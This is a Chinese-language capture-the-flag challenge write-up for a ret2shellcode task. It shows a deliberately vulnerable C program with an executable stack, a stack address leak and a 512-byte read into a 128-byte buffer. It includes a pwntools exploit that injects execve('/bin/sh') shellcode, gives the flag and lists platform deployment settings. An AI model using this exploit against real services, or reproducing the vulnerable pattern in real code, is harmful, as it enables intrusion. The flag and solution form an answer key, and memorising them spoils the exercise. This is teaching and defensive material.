# pwn-ret2shellcode

## 一、题目与考点

| 项 | 值 |
|---|---|
| 难度 | 中 |
| 考点 | NX 关闭；栈上执行 shellcode；地址泄露；缓冲区与 shellcode 自身 `push` 的冲突 |
| 容器端口 | 宿主机 9106 → 容器 1337 |
| Flag | `flag{ret2shellcode_on_the_stack}` |

## 题面（直接复制到平台「简介」）

一个把"你的数据放在了哪里"直接告诉你的小服务。用 `nc <地址> 9106` 连上去，它会先回一行 `stack: 0x...`，再等你发数据。目标：拿到 shell 并读出 `/app/flag`。

**提示**：`checksec` 会告诉你这个程序哪一块内存可以被当作代码执行；它主动报出那个地址这件事本身就不寻常。

## 二、题目描述

```
nc <host> 9106
stack: 0x7ffd........
```

```c
char buf[128];
printf("stack: %p\n", buf);   /* 把栈地址打印出来 */
read(0, buf, 0x200);          /* 读 512 字节到 128 字节的缓冲区 */
```

编译时加了 `-z execstack`，栈可执行（`PT_GNU_STACK` 为 RWX）。

## 三、解题步骤

1. 确认栈可执行：

```bash
readelf -lW files/pwn | grep GNU_STACK
# GNU_STACK  ...  RWE  0x10
checksec --file=files/pwn
# Stack: Executable | RWX: Has RWX segments
```

2. 找返回地址偏移：

```bash
objdump -d files/pwn | sed -n '/<main>:/,/ret/p'
```

```asm
4011a0: lea    rax,[rbp-0x80]   # buf
4011cc: call   401070 <read@plt>
4011d6: leave
4011d7: ret
```

`buf` 在 `rbp-0x80`，返回地址在 `rbp+8`，偏移 `0x80 + 8 = 136`。

3. 写 exp：

```python
p.recvuntil(b'stack: ')
buf = int(p.recvline().strip(), 16)          # 每次连接地址不同，必须现读

sc = asm(shellcraft.sh())                    # 23~48 字节的 execve("/bin/sh")
payload = sc.ljust(136, b'\x90') + p64(buf)
p.send(payload)
time.sleep(0.3)
p.sendline(b'cat /app/flag')                 # shell 起来后喂命令
```

4. 跑 exp：

```bash
python3 exp/exp.py
```

输出 `flag{...}`。

## 四、原理

`leave; ret` 之后 `rsp = rbp+16`，`ret` 弹出被覆盖的返回地址，这里填的是 `buf` 的地址，
于是 CPU 直接从栈上取指。`-z execstack` 让 `PT_GNU_STACK` 带 `E` 位，栈页可执行，
这条路径才成立；默认的 NX 会让 `ret` 到栈地址时直接 `SIGSEGV`。

**缓冲区大小为什么是 128**：shellcode 执行时 `rsp` 指向 `rbp+16`，它构造字符串用的
`push` 会依次写到 `rbp+8, rbp+0, rbp-8, rbp-0x10, rbp-0x18 ...`。如果缓冲区只有
64 字节（`buf = rbp-0x40`），这些写入会落在 `buf+0x28 ~ buf+0x38`，正好盖掉
shellcode 尾部还没执行的 `syscall` 指令，进程在 `syscall` 前就崩。
把缓冲区放大到 128 字节后，`push` 的落点全部在代码之后，问题消失。
另一种写法是在 shellcode 开头加 `sub rsp, 0x400`，把栈顶挪开。

## 五、防御建议

- 不要加 `-z execstack`；保持默认的 NX。
- 编译时加 `-fno-stack-protector` 之外的保护（canary/PIE）提高门槛，但 NX 是这条链的关键。
- 不要向用户泄露栈地址，ASLR 才有意义。
- 对 `read` 的长度做上界检查，别让一次读入超过缓冲区。

## 六、附件清单

| 文件 | 说明 |
|---|---|
| `files/pwn` | 与容器内一致的二进制 |
| `src/pwn.c` | 源码 |
| `exp/exp.py` | pwntools 脚本 |
| `Dockerfile` / `entrypoint.sh` / `docker-compose.yml` | 容器 |
| `checker/main.rx` | 判题脚本 |

`checksec`：

```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX unknown - GNU_STACK missing（PT_GNU_STACK 段被 -z execstack 改为 RWE）
Stack:    Executable
RWX:      Has RWX segments
PIE:      No PIE (0x400000)
Stripped: No
```

关键信息：`main = 0x401176`，`buf = rbp-0x80`，返回地址偏移 136，运行时打印 `buf` 地址。

---

## 平台镜像配置（添加镜像时照这张表填）

| 字段 | 填什么 | 说明 |
|---|---|---|
| 容器名称 | `pwn-ret2shellcode` | 与题目目录名、tar 文件名保持一致 |
| 镜像标签 | `<registry>/<bucket>/pwn-ret2shellcode` | 仓库名取自 tar 文件名（去扩展名），上传后 UI 自动带出 |
| 镜像版本 | 上传后生成的 Unix 时间戳 | 下拉选最新那条，不要手填 |
| 镜像拉取策略 | `Always` | 与平台默认一致 |
| 服务描述 | Pwn/交互题（nc 连上去打） | 只是备注，不影响运行 |
| 传输协议 | `tcp` | 全库只有 TCP 服务 |
| 应用协议 | `raw` | 裸 TCP / SSH / socat 选 raw |
| **服务端口** | **`1337`** | 容器内实际监听端口，必须与 Dockerfile 的 `EXPOSE` 一致 |
| CPU 限制 | `0.1, 0.3` | 最小, 最大（核） |
| 内存限制（MB） | `64, 128` | 最小, 最大 |
| 存储限制（MB） | `64, 1024` | 最小, 最大 |
| restricted | **勾选** | 平台会 drop `NET_BIND_SERVICE`，所以容器监听的是 `1337` 而不是 80 |
| 出网 | **关闭** | 本题不需要外网 |

> 端口必须填 **1337**。这是 socat / 裸 TCP 服务的监听端口，选手用 `nc <地址> <映射端口>` 连。
